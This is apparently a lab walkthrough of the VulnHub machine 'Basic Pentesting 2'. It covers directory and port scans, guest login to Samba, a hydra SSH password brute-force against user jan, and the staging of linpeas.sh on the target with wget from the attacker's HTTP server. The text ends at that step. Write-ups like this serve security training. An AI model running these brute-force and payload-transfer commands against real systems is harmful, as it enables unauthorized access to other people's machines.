# Basic Pentesting 2

- Attacking machine : Linux kali 5.9.15-1kali1 (2020-12-18) on IP address `10.10.10.4`
- Target machine : [Basic Pentesting 2](https://www.vulnhub.com/entry/basic-pentesting-2,241/) by Josiah Pierce on IP address `10.10.10.13`

## Vulnerability analysis

### Directory scan with `gobuster`

```sh
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.13
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/14 15:57:19 Starting gobuster
===============================================================
/development (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/14 15:59:13 Finished
===============================================================
```

#### /development

This directory contains two files :

##### dev.txt

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J"
```

Maybe obsolete versions of **SMB**, **Apache** and **strusts** are being used.

##### j.txt

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Passwords may be cracked with dictionary-based attacks.

### Port scan with `nmap` 

`nmap -T4 -A -p22,80,139,445,8009,8080 10.10.10.13`

```
Starting Nmap,7.91 ( https://nmap.org ) at 2021-01-14 16:06 EST
Nmap scan re,port for 10.10.10.13
Host is up (0.0014s latency).
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)   
| ssh-hostkey:                                                                           
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -2s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-01-14T16:07:09-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-14T21:07:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.17 seconds
```

## Exploitation

### Samba

We can log into the service with a file explorer using the login ```guest``` and an empty password.

![smb](smb.png)

We get the following ```staff.txt``` file :

```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but this is how mistakes happen. (This means you too, Jan!)

-Kay
```

We now know that the full name of the previous "J" and "K" are Jan and Kay.

### SSH brute-forcing with `hydra`

Now that we have the full usernames, we can try to crack the ssh password of Jan, as we know it is weak.

`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.13` 

7 minutes later, we get it :

![hydra](hydra.png)

## Privilege Escalation

### Importing `linpeas.sh` to the target server

Once logged through ssh, we want to transfer the `linpeas.sh` file from our attacking machine to the target server.

First, we set up a simple HTTP server on our attacking machine by the following command in a directory containing `linpeas.sh` :

`sudo python3 -m http.server -b 10.10.10.4 80`

Then, from our target, we enter `wget http://10.10.10.4/linpeas.sh` after moving to the directory `/tmp`.